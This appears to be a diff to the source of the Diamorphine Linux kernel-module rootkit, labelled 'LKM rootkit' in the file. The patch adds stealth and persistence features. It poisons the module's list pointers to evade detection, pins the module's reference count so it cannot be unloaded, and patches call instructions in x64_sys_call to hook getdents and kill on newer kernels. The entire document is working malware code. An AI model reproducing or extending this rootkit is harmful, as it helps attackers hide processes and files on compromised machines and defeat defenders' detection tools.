@@ -40,6 +40,11 @@ unsigned long init_begin;
 #define section_size init_begin - start_rodata
 #endif
 static unsigned long *__sys_call_table;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+void *sys_call;
+#endif
+
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 	static t_syscall orig_getdents;
@@ -300,9 +305,12 @@ tidy(void)
 
 static struct list_head *module_previous;
 static short module_hidden = 0;
+static short module_protected = 0;
+
 void
 module_show(void)
 {
+
 	list_add(&THIS_MODULE->list, module_previous);
 	module_hidden = 0;
 }
@@ -312,8 +320,44 @@ module_hide(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
+
+	/* Change list pointers to avoid decetct by LIST_POISON1 and LIST_POISON2 values */
+	THIS_MODULE->list.prev = (void *)0x8163;
+	THIS_MODULE->list.next = (void *)0x8163;
 	module_hidden = 1;
 }
+
+void
+module_protect(void)
+{
+	atomic_t *p_ref_count = &THIS_MODULE->refcnt;
+	int old_val;
+
+	do {
+		old_val = atomic_read(p_ref_count);
+		if (atomic_cmpxchg(p_ref_count, old_val, 0x8163) == old_val) {
+			break;
+		}
+	} while (1);
+	module_protected = 1;
+}
+
+void
+module_unprotect(void)
+{
+	atomic_t *p_ref_count = &THIS_MODULE->refcnt;
+	int old_val;
+
+	do {
+		old_val = atomic_read(p_ref_count);
+		if (atomic_cmpxchg(p_ref_count, old_val, 1) == old_val) {
+			break;
+		}
+	} while (1);
+
+	module_protected = 0;
+}
+
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 asmlinkage long
@@ -344,6 +388,10 @@ hacked_kill(pid_t pid, int sig)
 		case SIGMODINVIS:
 			if (module_hidden) module_show();
 			else module_hide();
+			break;
+		case SIGPROTECT:
+			if (module_protected) module_unprotect();
+			else module_protect();
 			break;
 		default:
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -398,6 +446,36 @@ unprotect_memory(void)
 #endif
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+void flipswitch_func(void *target_func, void *hacked_func) {
+	unsigned char *func_ptr = (unsigned char *)sys_call;
+
+	/* Search for call instruction to sys_kill in x64_sys_call */
+	for (size_t i = 0; i < DUMP_SIZE - 4; ++i) {
+		if (func_ptr[i] == 0xe9 || func_ptr[i] == 0xe8) { /* Found a call instruction */
+			int32_t rel = *(int32_t *)(func_ptr + i + 1);
+			void *call_addr = (void *)((uintptr_t)sys_call + i + 5 + rel);
+
+			if (call_addr == target_func) {
+
+				unprotect_memory();
+
+				/* Calculate new relative offset to fake_kill */
+				int32_t new_rel = (uintptr_t)hacked_func - ((uintptr_t)sys_call + i + 5);
+				int hooked_offset = i + 1;
+
+				memcpy(func_ptr + hooked_offset, &new_rel, sizeof(new_rel));
+
+				/* Re-enable write protection */
+				protect_memory();
+				break;
+			}
+		}
+	}
+}
+#endif
+
+
 static int __init
 diamorphine_init(void)
 {
@@ -414,7 +492,14 @@ diamorphine_init(void)
 #endif
 
 	module_hide();
+	module_protect();
 	tidy();
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+	sys_call = (t_syscall)resolve_sym("x64_sys_call");
+	if (!sys_call)
+		return -1;
+#endif
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
@@ -426,13 +511,17 @@ diamorphine_init(void)
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 #endif
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+	flipswitch_func(orig_getdents, hacked_getdents);
+	flipswitch_func(orig_getdents64, hacked_getdents64);
+	flipswitch_func(orig_kill, hacked_kill);
+#else
 	unprotect_memory();
-
 	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-
 	protect_memory();
+#endif
 
 	return 0;
 }
@@ -440,18 +529,24 @@ diamorphine_init(void)
 static void __exit
 diamorphine_cleanup(void)
 {
-	unprotect_memory();
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+	flipswitch_func(hacked_getdents, orig_getdents);
+	flipswitch_func(hacked_getdents64, orig_getdents64);
+	flipswitch_func(hacked_kill, orig_kill);
+#else
+	unprotect_memory();
 	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
-
 	protect_memory();
+#endif
+
 }
 
 module_init(diamorphine_init);
 module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
+MODULE_AUTHOR("m0nad, cu63");
 MODULE_DESCRIPTION("LKM rootkit");
